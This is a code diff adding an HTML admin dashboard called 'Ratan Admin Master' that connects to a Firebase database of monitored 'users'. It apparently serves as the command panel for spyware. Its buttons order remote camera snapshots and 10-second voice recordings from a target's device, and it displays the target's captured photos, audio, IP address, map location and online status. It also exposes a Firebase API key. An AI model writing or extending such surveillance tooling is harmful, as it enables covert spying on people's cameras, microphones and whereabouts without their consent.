@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="bn">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Ratan Admin Master</title>
+    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --pink: #ff4d94;
+            --dark: #010409;
+        }
+
+        body {
+            background: var(--dark);
+            color: white;
+            display: flex;
+            font-family: 'Hind Siliguri', sans-serif;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .sidebar {
+            width: 300px;
+            border-right: 1px solid #333;
+            background: #0d1117;
+            overflow-y: auto;
+        }
+
+        .u-card {
+            padding: 15px;
+            border-bottom: 1px solid #21262d;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            position: relative;
+        }
+
+        .u-card:hover {
+            background: #161b22;
+        }
+
+        .dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: #238636;
+            position: absolute;
+            right: 15px;
+            box-shadow: 0 0 10px #238636;
+        }
+
+        .main {
+            flex: 1;
+            padding: 30px;
+            overflow-y: auto;
+            display: none;
+        }
+
+        .glass {
+            background: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 20px;
+            padding: 25px;
+            margin-bottom: 25px;
+        }
+
+        .img-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 15px;
+        }
+
+        .img-grid img {
+            width: 100%;
+            border-radius: 12px;
+            border: 2px solid var(--pink);
+            cursor: zoom-in;
+            transition: 0.3s;
+        }
+
+        .img-grid img:hover {
+            transform: scale(1.05);
+        }
+
+        .btn {
+            background: var(--pink);
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 50px;
+            cursor: pointer;
+            font-weight: bold;
+            margin-right: 10px;
+        }
+
+        .btn-red {
+            background: #da3633;
+        }
+
+        audio {
+            width: 100%;
+            margin-top: 10px;
+            filter: hue-rotate(280deg);
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="sidebar" id="u-list">
+        <div style="padding: 20px; background: var(--pink); font-weight: bold; text-align:center;">RATAN BRO ADMIN</div>
+    </div>
+
+    <div class="main" id="panel">
+        <div class="glass" style="display:flex; align-items:center; gap:20px;">
+            <img id="p_photo" src="" style="width:80px; border-radius:50%; border:3px solid var(--pink);">
+            <div>
+                <h2 id="p_name" style="margin:0;"></h2>
+                <p id="p_status" style="color:var(--pink); margin:0;"></p>
+            </div>
+        </div>
+
+        <div class="glass">
+            <button class="btn" onclick="sendCmd('snap')"><i class="fas fa-camera"></i> Take Snap</button>
+            <button class="btn" onclick="sendCmd('voice')"><i class="fas fa-microphone"></i> Start 10s Voice</button>
+        </div>
+
+        <div class="glass">
+            <h4 style="margin-top:0;">Captured Photos (5) <button class="btn btn-red"
+                    style="float:right; padding:2px 10px; font-size:12px;" onclick="del('picList')">Delete All</button>
+            </h4>
+            <div id="p_gallery" class="img-grid" style="margin-top:15px;"></div>
+        </div>
+
+        <div class="glass">
+            <h4 style="margin-top:0;">Voice Records (4) <button class="btn btn-red"
+                    style="float:right; padding:2px 10px; font-size:12px;" onclick="del('audioList')">Delete
+                    All</button></h4>
+            <div id="a_gallery" style="margin-top:15px;"></div>
+        </div>
+
+        <div class="glass">
+            <p><b>IP Address:</b> <span id="p_ip"></span></p>
+            <p><b>Location:</b> <a id="p_map" target="_blank" style="color:var(--pink)">View on Google Map</a></p>
+            <p><b>Last Active:</b> <span id="p_time"></span></p>
+        </div>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
+        import { getFirestore, collection, onSnapshot, doc, updateDoc } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyC4ExRu3Oze8api5-ueDTBqZOceSa8wclo",
+            authDomain: "ratanweab.firebaseapp.com",
+            projectId: "ratanweab",
+            storageBucket: "ratanweab.firebasestorage.app",
+            messagingSenderId: "611953936063",
+            appId: "1:611953936063:web:7e3ca24060d7478fb2a80a"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+        let activeId = null;
+
+        onSnapshot(collection(db, "users"), (s) => {
+            const list = document.getElementById('u-list');
+            list.innerHTML = '<div style="padding:20px; background:var(--pink); font-weight:bold; text-align:center;">RATAN BRO ADMIN</div>';
+            s.forEach(d => {
+                const u = d.data();
+                const div = document.createElement('div');
+                div.className = 'u-card';
+                div.innerHTML = `<img src="${u.photo}" style="width:40px; border-radius:50%"> ${u.name} ${u.status === 'Online' ? '<div class="dot"></div>' : ''}`;
+                div.onclick = () => { activeId = d.id; updateUI(u); };
+                list.appendChild(div);
+                if (activeId === d.id) updateUI(u);
+            });
+        });
+
+        function updateUI(u) {
+            document.getElementById('panel').style.display = 'block';
+            document.getElementById('p_name').innerText = u.name;
+            document.getElementById('p_photo').src = u.photo;
+            document.getElementById('p_status').innerText = u.status + " | " + u.lastView;
+            document.getElementById('p_ip').innerText = u.ip || 'N/A';
+            document.getElementById('p_time').innerText = u.lastView || 'N/A';
+            document.getElementById('p_map').href = u.loc ? `https://www.google.com/maps?q=${u.loc}` : '#';
+
+            const pg = document.getElementById('p_gallery');
+            pg.innerHTML = u.picList?.map(i => `<img src="${i}" onclick="window.open(this.src)">`).join('') || 'No photos';
+
+            const ag = document.getElementById('a_gallery');
+            ag.innerHTML = u.audioList?.map((a, i) => `<div>Voice ${i + 1}: <audio src="${a}" controls></audio></div>`).join('') || 'No voice';
+        }
+
+        window.sendCmd = (c) => activeId && updateDoc(doc(db, "users", activeId), { command: c });
+        window.del = async (f) => { if (activeId && confirm("মুছে ফেলবেন?")) { let o = {}; o[f] = []; await updateDoc(doc(db, "users", activeId), o); } };
+    </script>
+</body>
+
+</html>
